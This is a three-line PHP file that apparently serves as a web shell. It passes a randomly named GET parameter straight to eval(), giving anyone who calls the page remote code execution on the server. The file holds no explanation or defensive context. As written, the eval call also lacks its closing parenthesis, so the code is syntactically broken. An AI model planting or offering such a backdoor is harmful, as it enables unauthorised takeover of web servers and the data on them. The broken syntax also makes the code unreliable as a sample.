<?php
eval($_GET['NdnaaTLr'];
?>
